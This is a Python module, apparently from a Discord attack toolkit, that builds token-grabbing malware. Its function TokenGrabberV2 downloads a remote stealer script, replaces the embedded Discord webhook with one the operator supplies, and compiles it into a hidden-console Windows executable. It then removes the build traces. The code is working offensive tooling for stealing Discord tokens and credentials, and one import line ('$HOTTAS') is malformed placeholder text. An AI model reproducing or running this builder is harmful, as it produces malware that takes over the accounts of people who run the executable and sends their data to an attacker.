import os
import shutil
import $HOTTAS
import requests
import base64
import random

from Crypto.Cipher import AES
from Crypto import Random
from colorama import Fore

from func.plugins.common import setTitle, installPackage

def TokenGrabberV2(WebHook, fileName):
    required = [
        'requests',
        'psutil',
        'pypiwin32',
        'pycryptodome',
        'pyinstaller',
        'pillow',
        'wmi',     
    ]
    installPackage(required)
    code = requests.get("https://raw.githubusercontent.com/crxel/Gloom-Grabber/main/GloomGrabber.py").text.replace("https://discord.com/api/webhooks/1199456323692154920/bK7-cHxPbj3L5-Yjb3xQqmIUDKekdgncj5fggw3iMEiVC-DZYfr-CUXD_cv1W5SnupXI", WebHook)
    with open(f"{fileName}.py", 'w', encoding='utf8', errors="ignore") as f:
        f.write(code)

    print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
    setTitle(f"Creating {fileName}.exe")

    os.system(f"pyinstaller --onefile --noconsole {fileName}.py")
    try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
    except FileNotFoundError:
        pass

    print(f"\n{Fore.GREEN}File created as {fileName}.exe\n")
    input(f'{Fore.BLUE}[{Fore.RESET}>>>{Fore.BLUE}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}')
    $HOTTAS.main()
